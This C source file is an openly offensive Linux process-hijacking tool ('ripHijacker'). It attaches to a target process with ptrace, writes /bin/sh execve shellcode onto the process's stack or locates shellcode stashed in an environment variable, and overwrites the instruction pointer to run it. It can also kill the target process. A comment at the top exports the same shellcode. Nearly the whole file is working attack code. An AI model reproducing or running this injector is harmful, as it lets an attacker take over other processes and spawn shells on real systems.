/*export A=$(python -c "print '\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <sys/user.h>


char shellcode[] __attribute__((section(".myshellcode,\"awx\",@progbits#"))) = 	"\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48"
										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
										"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
		  							
int main(int argc, char **argv)
{
	char *envVar, *name;
	int c,i,size, options = 0;
	unsigned long long int pointed;
	pid_t pid;
	struct user_regs_struct registers;
    
	void print()
	{
		printf("\n      _       _    _ _ _            _             \n");
		printf("     (_)     | |  | (_|_)          | |            \n");
		printf(" _ __ _ _ __ | |__| |_ _  __ _  ___| | _____ _ __ \n");
		printf("| '__| | '_ \\|  __  | | |/ _` |/ __| |/ / _ \\ '__|\n");
		printf("| |  | | |_) | |  | | | | (_| | (__|   <  __/ |   \n");
		printf("|_|  |_| .__/|_|  |_|_| |\\__,_|\\___|_|\\_\\___|_|   \n");
		printf("       | |           _/ |                         \n");
		printf("       |_|  ~antz~  |__/                          \n\n");
	}

	void usage()
	{
		print();
		printf(" Usage: %s -p <target_pid> [-e <environment_variable> -n <target_program_name>]\n", argv[0]);
		exit(0);
	}

	while ((c = getopt(argc, argv, "p:e:n:")) != -1)
	{
		switch(c) 
   		{
    			case 'p':
        			pid = atoi(optarg);
        			break;
    			case 'e':
        			envVar = strdup(optarg);
        			++options;
           			break;
    			case 'n':
        			name = strdup(optarg);
        			++options;
       				break;
    			default:
    				usage();
    				break;
    		}	
	}

	if(!pid || (options != 2 && options != 0))
	{
		usage();
	}

	print();
	printf("\n Attaching to process %d..\n", pid);
	
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
	{
		printf(" Error: %s\n", strerror(errno));
		exit(1);
	}

	wait(NULL);
		
	printf(" Process %d succesfully attached!!\n", pid);
	printf(" Reading tracee's registers..\n");		
		
	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
		
	printf(" Done.\n");
	printf("\n Press [Enter] to continue..\n\n");
	getchar();

	if(!options)
	{
		size = sizeof(shellcode);
		printf(" Injecting Shellcode into tracee's stack..\n");		

		for(i=0; i<size;i++)
		{
			ptrace(PTRACE_POKETEXT, pid, registers.rsp+i, *(shellcode+i));
		}
		
		printf(" Done.\n");
		printf(" Overwriting tracee's $rip with $rsp..\n\n");
        
        	registers.rip = registers.rsp + 2;
        	ptrace(PTRACE_SETREGS, pid, NULL, &registers);

    	}
	else
	{
		int check = 0;
		size = sizeof(unsigned long long int) * 2;
		unsigned long long int wanted, current_value, *chunk = malloc(size);
		memset(chunk, 0x0, size);
		char *envAddr = getenv(envVar);
		if(envAddr == NULL)
		{
			printf(" Variable %s not found!\n", envVar);
			exit(1);
		}
		memcpy(chunk, envAddr, size); 
		envAddr += (strlen(argv[0]) - strlen(name))*2;
		
    		printf("\n~~~~~~ If ASLR is disabled, variable %s will be at %p ~~~~~~~\n", envVar, envAddr);
		
		pointed = ptrace(PTRACE_PEEKTEXT, pid, envAddr, NULL);

		if(pointed == (unsigned long long int) *chunk)
		{
			printf("\n ASLR is diasbled.\n");
			printf("\n Overwriting tracee's $rip with %s's address..\n", envVar);
	
			registers.rip = (unsigned long long int) envAddr;
			ptrace(PTRACE_SETREGS, pid, NULL, &registers);
		}
		else
		{
			printf("\n ASLR is enabled.\n");
			printf(" Searching %s's address...\n", envVar);

			for(i=0; i<1024; i++)
			{
				current_value = ptrace(PTRACE_PEEKTEXT, pid, registers.rsp+(i*0x08), NULL);
				
				if( current_value == *chunk)
				{
					wanted = registers.rsp+(i*0x08);
					check = 1;
				}
			}
			if(check)
			{
				printf(" %s's address is 0x%.16llx\n", envVar, wanted);
				printf("\n Overwriting tracee's $rip with %s's address..\n", envVar);
				
				registers.rip = wanted;
				ptrace(PTRACE_SETREGS, pid, NULL, &registers);
      			}
			else
			{
				printf(" %s's address not found.\n", envVar);
				printf(" If %s will restart we may retry to find %s address!\nDo you want to try to kill [%d] process? (Y/N)\n", name, envVar, pid);
				if(getchar() == 'Y')
				{
					if(kill(pid, SIGKILL) == -1)
					{
						printf(" Error: %s\nBye!\n", strerror(errno));
						exit(1);
					}
					else
					{
						printf(" Killed.\nBye!\n");
						exit(0);
					}
				}
				else
				{
					printf(" Bye!\n");
					exit(0);
				} 
			}	
		}

	}

	printf(" Done.\n");
	
	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
	pointed = ptrace(PTRACE_PEEKTEXT, pid, registers.rip, NULL);

    	printf(" Content of $rip: 0x%.16llx\n", registers.rip);
    	printf(" Content of addr pointed by $rip: 0x%.16llx\n", pointed);
	printf("******* Process[%d] pwned! *******\n", pid);
		
	ptrace(PTRACE_DETACH, pid, NULL,NULL);
	
	exit(0);	
}
